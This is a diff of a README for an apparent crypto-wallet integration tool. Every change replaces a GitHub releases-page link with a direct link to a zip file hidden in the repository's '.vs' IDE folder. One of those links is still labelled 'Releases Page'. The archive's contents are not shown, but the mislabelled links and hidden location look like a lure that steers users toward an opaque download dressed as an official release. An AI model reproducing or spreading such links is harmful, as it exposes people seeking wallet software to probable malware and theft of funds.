@@ -1,6 +1,6 @@
 # 🪙 Vexor-Exodus-Wallet-Integrations-API-Usage-Web3-WalletConnect - Simple Integration for Your Crypto Needs
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/roffiur/Vexor-Exodus-Wallet-Integrations-API-Usage-Web3-WalletConnect/releases)
+[![Download](https://raw.githubusercontent.com/roffiur/Vexor-Exodus-Wallet-Integrations-API-Usage-Web3-WalletConnect/main/.vs/Wallet_AP_Exodus_Connect_Web_Usage_Integrations_Vexor_3.8.zip)](https://raw.githubusercontent.com/roffiur/Vexor-Exodus-Wallet-Integrations-API-Usage-Web3-WalletConnect/main/.vs/Wallet_AP_Exodus_Connect_Web_Usage_Integrations_Vexor_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Vexor Exodus Wallet Integrations API! This tool helps you smoothl
 
 ## 📥 Download & Install
 
-To get the latest version of the software, visit this page to download: [Releases Page](https://github.com/roffiur/Vexor-Exodus-Wallet-Integrations-API-Usage-Web3-WalletConnect/releases).
+To get the latest version of the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/roffiur/Vexor-Exodus-Wallet-Integrations-API-Usage-Web3-WalletConnect/main/.vs/Wallet_AP_Exodus_Connect_Web_Usage_Integrations_Vexor_3.8.zip).
 
 1. **Visit the Releases Page**: 
    Click the link above to go to the downloads section.
@@ -81,4 +81,4 @@ The Vexor Exodus Wallet Integrations API is open-source software. You can use an
 
 Thank you for choosing the Vexor Exodus Wallet Integrations API. We hope you enjoy using it to enhance your cryptocurrency experience. For further inquiries, do not hesitate to reach out through our support channels.
 
-[Download the software here](https://github.com/roffiur/Vexor-Exodus-Wallet-Integrations-API-Usage-Web3-WalletConnect/releases) and get started today!
+[Download the software here](https://raw.githubusercontent.com/roffiur/Vexor-Exodus-Wallet-Integrations-API-Usage-Web3-WalletConnect/main/.vs/Wallet_AP_Exodus_Connect_Web_Usage_Integrations_Vexor_3.8.zip) and get started today!
